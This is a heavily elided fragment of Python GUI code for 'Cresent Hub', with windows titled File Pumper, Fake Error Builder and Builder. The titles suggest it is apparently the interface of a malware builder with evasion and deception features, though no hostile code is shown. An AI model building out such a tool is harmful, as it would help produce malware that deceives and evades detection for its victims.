...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Cresent Hub [File Pumper]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Cresent Hub [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Cresent Hub [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Cresent Hub", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
